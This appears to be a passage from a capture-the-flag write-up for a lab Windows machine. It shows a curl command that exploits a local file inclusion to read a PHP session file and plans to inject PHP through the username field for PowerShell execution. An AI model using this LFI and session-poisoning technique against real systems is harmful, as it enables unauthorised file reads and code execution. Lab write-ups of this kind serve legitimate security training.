FootHold

When I registered account via /user/registoration.php and logged on, it revealed that the user portal is under development. However, php session id is set. On the windows system, the session file would be stored in C:\windows\temp folder. Since we know there is LFI vulnerability, we can read it.

┌──(kali㉿kali)-[~/tempo/sniper]
└─$ curl -G http://10.129.229.6/blog/ --data-urlencode 'lang=/windows/temp/sess_c5jnkrl843e15f9dm0dbkkps2q'
...
</body>

</html>
username|s:4:"test";
</html>

This file seems to include username. So, if we can inject php code using username variable, we might be able to execute powershell script.
